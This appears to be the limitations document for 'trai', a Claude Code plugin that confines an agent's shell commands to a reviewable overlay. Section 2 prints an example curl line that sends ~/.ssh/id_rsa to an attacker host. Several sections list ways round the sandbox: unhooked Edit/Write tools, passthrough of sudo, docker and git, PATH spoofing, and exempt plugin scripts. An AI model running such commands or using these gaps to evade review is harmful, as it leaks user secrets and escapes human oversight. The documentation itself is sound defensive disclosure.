# Known limitations of `trai`

Authoritative list. `README.md` summarizes in three bullets and links here. If you're surprised by plugin behavior, start here.

---

## 1. `Edit` / `Write` / `MultiEdit` tool calls are **not** sandboxed

**What happens.** When Claude uses its built-in `Edit`, `Write`, or `MultiEdit` tools, the file write happens inside Claude Code's own Node process — not as a subprocess. Our `PreToolUse(Bash)` hook never fires for these tools, so the writes go directly to the real filesystem.

**Example.** You ask Claude to "rewrite `src/api.ts`." Claude uses `Edit`. The file changes in your working tree *immediately*, not in the overlay. `/trai:diff` will not show this change.

**Workaround.** Use git to review and revert Edit/Write/MultiEdit changes. Our review flow is for *shell-level* side effects (installs, scripts, migrations). Your file edits should be tracked by git anyway.

**Why we don't fix this.** Intercepting `Edit` / `Write` / `MultiEdit` with a hook would require rewriting the `file_path` parameter to point into an overlay directory, plus maintaining a bidirectional path map for later commit. It breaks Claude's mental model of the filesystem and introduces a whole class of bugs around relative paths, symlinks, and cross-tool consistency. Not in v1.

---

## 2. Not a security sandbox

**What this means.** A compromised agent — prompt-injected, misaligned, or handed a malicious tool output — can still harm you in ways post-hoc review won't catch:

- **Network exfiltration.** `curl api.attacker.com/exfil -d @~/.ssh/id_rsa` succeeds before you see any diff.
- **API calls with user credentials.** Hitting your GitHub token's full privilege scope.
- **Destructive `git` commits** to a remote you have push access to (git is on the passthrough list).
- **Process side effects** that don't touch disk (signaling, resource exhaustion).

**Why.** Our model only captures filesystem writes inside the overlay. The network, process-table, IPC, and anything running on a remote service are untouched.

**Workaround for real security needs.** Combine this plugin with Claude Code's built-in sandbox (bubblewrap on Linux, Seatbelt on macOS) and/or revoke credentials the agent shouldn't have. `trai` is *complementary* to those, not a replacement.

---

## 3. `sudo`, `docker`, `podman` are passthrough

**What happens.** Any command starting with `sudo`, `docker`, or `podman` is executed directly, not inside the `try` overlay. A warning is emitted to Claude's context so it knows the sandbox was bypassed.

**Example.** `sudo apt install postgresql-16` runs against the real system. No review possible.

**Why.**

- `sudo` is a setuid binary; inside an unprivileged user namespace it fails opaquely (`sudo: effective uid is not 0`), which is worse than just passing through.
- `docker` and `podman` are themselves sandboxing primitives; nesting them inside `try` is a known-broken combination ([upstream issue #19](https://github.com/binpash/try/issues/19)).

**Workaround.** For sudo-level changes that *must* be reviewed, run `try <cmd>` manually in a shell outside Claude. For container work, rely on the container's own cleanup semantics.

---

## 4. Long-running daemons break the overlay

**What happens.** A `Bash` call like `npm run dev &` or `python -m http.server &` starts a process that outlives the `try` invocation. The process continues to reference the overlay's mounted filesystem. Two things go wrong:

1. The process sees overlay paths, not real paths. If you `/trai:commit` later, the process's open file handles point at the now-obsolete upperdir.
2. `/trai:discard` may fail to clean the overlay because files are still open.

**Example.** Claude runs `python -m http.server 8000 &`. You `/trai:commit`. The server is still running, serving the overlay tree. You eventually `kill` it; the server's open sockets close, but the overlay dir is still referenced somewhere.

**Workaround.** Add long-running command patterns to `${CLAUDE_PLUGIN_DATA}/config.json` passthrough list. Or run daemons yourself, outside Claude.

---

## 5. Overlays can grow large

**What happens.** A `cargo build` or `npm install` inside an overlay can consume multiple GB. `$XDG_STATE_HOME/trai/sessions/` grows unboundedly if you never discard.

**Example.** A week of sessions, each with a big build, eats 50 GB.

**Workaround.**

- `scripts/doctor.sh` warns on startup if the state dir has less than 1 GB free.
- `/trai:status` shows `du -sh` of the current overlay.
- `/trai:discard --yes` immediately reclaims.
- `scripts/gc.sh` (v2) will clean overlays older than N days.

---

## 6. `/trai:commit` is destructive and fast

**What happens.** `try commit <overlay>` applies every change in the overlay to the real filesystem with no second prompt. File modifications overwrite. Deletions delete. Renames rename. There is no "dry run" after `/trai:commit` is invoked.

**Workaround.** Always run `/trai:diff` first. The slash command's markdown body reminds you. If in doubt, `/trai:discard` and re-do.

---

## 7. `try` is prototype-quality

**What this means.** `try` has 30+ open issues around edge cases:

- **Nested bind mounts.** `/home` on a separate partition, `/var/lib/docker` on tmpfs, btrfs subvolumes under `$HOME` can make overlayfs refuse to stack. Symptom: cryptic mount errors at session start.
- **NFS / SMB homedirs.** `try` cannot overlay a remote filesystem. See §11 for the full duvel story; `scripts/doctor.sh` warns but does not refuse.
- **AppArmor on Ubuntu 24.04+.** The default profile blocks unprivileged `unshare` + `mount` combos. Symptom: `EACCES: /proc/self/setgroups`.
- **Kernels ≥ 6.6.** Overlayfs API changes have broken `try` on specific point releases; upstream patches arrive on a lag.
- **Shared `-D` leaves `temproot/` poisoned.** Upstream's `sandbox_valid_or_empty()` rejects any sandbox whose `temproot/` contains non-directory entries, but `try`'s own chroot setup creates symlinks there and its cleanup isn't reliable. Symptoms: `ln: failed to create symbolic link 'temproot//bin/bin': Permission denied` on the 2nd call, `try: given sandbox 'X' is invalid` on the 3rd. Mitigation: `hooks/pre-bash.sh` wipes `$overlay/temproot/` before each invocation. User data lives in `upperdir/`, so this is safe. See `docs/design-notes.md` §9.

**Workaround.** `scripts/doctor.sh` checks the most common failure modes and prints remediation. For anything else, report upstream.

---

## 8. One session at a time

**What happens.** The plugin enforces a single active Claude session via lockfile at `$XDG_STATE_HOME/trai/lock`. If you start a second Claude instance in the same user account, the plugin self-disables in the second session and prints a banner.

**Why.** Two concurrent `try -D <same-dir>` invocations can race on the overlay's `workdir` and corrupt metadata.

**Workaround.** Finish or discard one session before starting another. The lock is released on `SessionEnd`.

---

## 9. `/trai:explore` shells cannot run inside the Claude TUI

**What happens.** `/trai:explore` prints the exact `try explore /path/to/overlay` command for you to paste into your own terminal. We can't spawn an interactive shell inside Claude's UI cleanly.

**Workaround.** Open a separate terminal and paste.

---

## 10. Passthrough is pattern-match, not program-identity

**What happens.** Our passthrough list matches command *patterns* (`git *`). A malicious script named `git` on the agent's `$PATH` would be passthrough-ed. A complex pipeline (`echo foo | git ...`) may not match depending on the pattern.

**Workaround.** Trust the binaries on your `$PATH`. If you don't, this plugin isn't your problem.

---

## 11. NFS `$HOME` + symlinked cwd is a landmine

**What happens.** When `$HOME` is on NFS (common on shared HPC / research hosts), `try` can't overlay `/home` — NFS doesn't support overlayfs as a lowerdir on most kernels. Inside the chroot, `/home` becomes a stub dir missing everything. If the user launched Claude from a path that *traverses* `/home` — e.g. `/home/alice/local/code/proj` where `/home/alice/local → /scratch/alice` — the symlink doesn't resolve inside the chroot and every Bash call fails with:

```
chroot_executable.sh: line 13: cd: /home/alice/local/code/proj: No such file or directory
```

Additionally, `try`'s default state dir under `$XDG_STATE_HOME` resolves to `$HOME/.local/state` — which is also NFS, which breaks the overlay's upperdir. Overlays on NFS fail at mount time.

**Workarounds.**

1. Set `XDG_STATE_HOME=/local-disk/some-path` **before launching Claude** so overlays live on a real filesystem.
2. Launch Claude from the **real** local-disk path, not a symlink that traverses `$HOME`:
   ```bash
   cd /scratch/alice/code/proj      # NOT /home/alice/local/code/proj
   claude
   ```

**Why the doctor only warns.** We discovered during real use that `$HOME`-on-NFS plus working from `/tmp` or `/scratch` is a perfectly viable configuration; only the *intersection* (NFS-$HOME AND cwd traverses $HOME AND overlay dir on $HOME) is fatal. A hard refusal would be wrong. The doctor warns on `$HOME`-NFS and prints the two-line workaround.

---

## 12. Plugin-internal scripts are exempt from the wrapper, by design

**What this means.** Any Bash tool call whose command path starts with `${CLAUDE_PLUGIN_ROOT}/` passes through unsandboxed. This is required for the plugin to work:

- `/trai:doctor` needs to inspect the *real* host (kernel version, mountpoints, `try` binary), not the overlay.
- `/trai:passthrough` writes a bypass token at `$XDG_STATE_HOME/trai/bypass-next` — a path on the host, not in the overlay. If sandboxed, the token lands in the overlay's upperdir and the next call never sees it.
- `/trai:commit` / `/trai:discard` manipulate the session pointer on the real FS.

**Why you'd care.** If you add a new slash-command backer under `scripts/cmd-*.sh`, it's automatically exempted. If you shell out to something *else* that needs exemption (some diagnostic tool not under `$CLAUDE_PLUGIN_ROOT`), you have to either move it into the plugin tree or add it to `config/defaults.json`'s passthrough list.

---

## Quick summary

| #  | Limitation | Workaround |
|----|---|---|
|  1 | Edit/Write/MultiEdit bypass sandbox | Use git |
|  2 | Not a security sandbox | Combine with Claude Code's built-in sandbox |
|  3 | sudo/docker/podman passthrough | Manual review outside Claude |
|  4 | Long daemons break overlay | Passthrough list; run daemons manually |
|  5 | Overlays grow | `/trai:status`, `/trai:discard`; doctor warns |
|  6 | Commit is destructive | Always `/trai:diff` first |
|  7 | `try` is prototype (incl. poisoned `temproot/`) | Doctor diagnoses; pre-bash pre-cleans temproot |
|  8 | Single session only | Finish/discard first session first |
|  9 | Explore shell outside TUI | Paste in another terminal |
| 10 | Passthrough is pattern-match | Trust `$PATH` binaries |
| 11 | NFS `$HOME` + symlinked cwd | Use real local-disk path; set `XDG_STATE_HOME` |
| 12 | Plugin scripts exempt from wrapper | By design; add custom exemptions to passthrough |
